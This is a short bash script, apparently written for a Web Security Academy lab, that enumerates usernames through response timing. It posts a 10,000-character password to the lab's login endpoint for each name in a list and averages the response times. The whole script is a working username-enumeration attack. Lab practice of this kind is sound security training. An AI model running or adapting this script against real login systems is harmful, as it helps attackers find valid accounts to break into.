#!/bin/bash

# Generate a very long password (10000 characters)
LONG_PASSWORD=$(python3 -c "print('A' * 10000)")

echo "Testing response times with long password (10000 chars)..."
echo "========================================================="
echo ""
echo "Username             | Response Time (ms)"
echo "----------------------------------------"

# Test each username multiple times and average
while IFS= read -r user; do
    total_time=0
    runs=3
    
    for i in $(seq 1 $runs); do
        start=$(date +%s%3N)
        
        curl -s -X POST "https://0a0e004a04be7fa081da8aa70008003b.web-security-academy.net/login" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Cookie: session=Zj5ZT2FoyIS2txq2JmIWYDW41JykgiqP" \
            -d "username=$user&password=$LONG_PASSWORD" > /dev/null
        
        end=$(date +%s%3N)
        time_taken=$((end - start))
        total_time=$((total_time + time_taken))
    done
    
    avg_time=$((total_time / runs))
    printf "%-20s | %d ms\n" "$user" "$avg_time"
    
done < <(head -20 usernames.txt)